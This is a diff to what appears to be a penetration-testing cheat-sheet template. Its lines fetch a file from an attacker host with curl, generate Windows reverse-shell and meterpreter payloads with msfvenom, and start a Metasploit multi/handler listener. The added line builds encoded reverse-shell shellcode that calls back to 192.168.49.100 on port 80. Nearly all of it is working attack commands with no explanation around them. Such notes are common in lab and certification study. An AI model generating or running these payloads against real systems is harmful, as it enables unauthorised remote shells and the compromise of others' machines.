@@ -216,6 +216,9 @@ curl http://<% tp.frontmatter["LHOST"] %>/<FILE> > <OUTPUT_FILE>
 #MSF
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<% tp.frontmatter["LHOST"] %> LPORT=<LPORT> -f exe -o <FILE>.exe
 
+#MSF reverse in c (-e: encoder, -b: bad characters)
+msfvenom -p windows/shell_reverse_tcp -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" LHOST=192.168.49.100 LPORT=80 -e x86/alpha_mixed -f c
+
 msf6 > use exploit/multi/handler
 [*] Using configured payload generic/shell_reverse_tcp
 msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
